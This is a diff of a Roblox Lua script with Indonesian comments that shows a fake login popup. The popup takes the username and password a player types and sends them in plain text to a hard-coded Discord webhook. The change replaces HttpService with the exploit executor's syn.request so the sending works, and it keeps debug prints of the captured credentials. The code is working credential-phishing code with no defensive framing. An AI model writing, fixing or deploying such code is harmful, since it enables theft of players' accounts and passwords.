@@ -3,25 +3,29 @@ local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlI
 
 -- Fungsi untuk mengirim data ke Discord
 local function sendToDiscord(username, password)
-    local httpService = game:GetService("HttpService")
-    local payload = httpService:JSONEncode({
-        content = "Login attempt:\nUsername: " .. username .. "\nPassword: " .. password
-    })
+    if syn and syn.request then
+        -- Menggunakan syn.request untuk mengirim data
+        local response = syn.request({
+            Url = webhook_url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode({
+                content = "Login attempt:\nUsername: " .. username .. "\nPassword: " .. password
+            })
+        })
 
-    print("Payload yang dikirim:", payload) -- Debugging: Pastikan payload terlihat di Output
-
-    -- Gunakan pcall untuk menangkap kesalahan
-    local success, err = pcall(function()
-        httpService:PostAsync(webhook_url, payload, Enum.HttpContentType.ApplicationJson)
-    end)
-
-    if success then
-        print("Data berhasil dikirim ke Discord!") -- Debugging: Konfirmasi keberhasilan
+        -- Debugging hasil
+        if response.Success then
+            print("Data berhasil dikirim ke Discord!")
+        else
+            print("Gagal mengirim data ke Discord:", response.StatusCode, response.Body)
+        end
     else
-        print("Gagal mengirim data ke Discord:", err) -- Debugging: Cetak pesan kesalahan
+        print("Executor Anda tidak mendukung HTTP requests!")
     end
 end
-
 
 -- Membuat GUI
 local screenGui = Instance.new("ScreenGui")
@@ -76,13 +80,13 @@ loginButton.TextColor3 = Color3.new(1, 1, 1)
 loginButton.MouseButton1Click:Connect(function()
     local username = usernameBox.Text
     local password = passwordBox.Text
-    print("Tombol login ditekan") -- Debugging: Cetak log ketika tombol ditekan
+    print("Tombol login ditekan!") -- Debugging
 
     if username ~= "" and password ~= "" then
-        print("Username:", username, "Password:", password) -- Debugging: Lihat nilai input
-        sendToDiscord(username, password) -- Panggil fungsi pengiriman
-        frame:Destroy() -- Hapus popup setelah login
+        print("Username:", username, "Password:", password) -- Debugging input
+        sendToDiscord(username, password)
+        frame:Destroy()
     else
-        print("Username atau password tidak boleh kosong!") -- Debugging: Kasus input kosong
+        print("Username atau password kosong!")
     end
 end)
